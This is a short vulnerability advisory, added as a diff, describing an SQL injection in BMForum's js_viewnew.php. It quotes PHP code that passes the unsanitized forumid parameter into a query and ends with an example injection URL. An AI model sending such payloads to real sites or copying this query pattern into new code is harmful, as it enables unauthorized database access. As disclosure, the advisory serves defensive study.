@@ -1,0 +1,25 @@
+# Author: Stephan Sattler
+# Software Website: http://www.bmforum.com/
+# Software Link: http://www.bmforum.com/down/
+# Required: magic quotes = Off
+
+[ Vulnerability ]
+ 
+ /add-on/js_viewnew.php line 20++:
+
+$length = $_GET['length'];
+$forumid = $_GET['forumid'];
+$num = $_GET['num'];
+$forumnum=$forumid;
+
+{....}
+
+$query = "SELECT * FROM {$database_up}threads WHERE forumid='$forumid' ORDER BY 'changetime' DESC LIMIT 0,$num";
+
+#Explanation:
+
+$forumid($_GET['forumid']) isn't sanitized at all, an attacker could use this for an SQL-Injection.
+
+#Example for an injection:
+
+http://[site]/[folder]/js_viewnew.php?forumid=2'+AnD+1='1&num=1&length=1
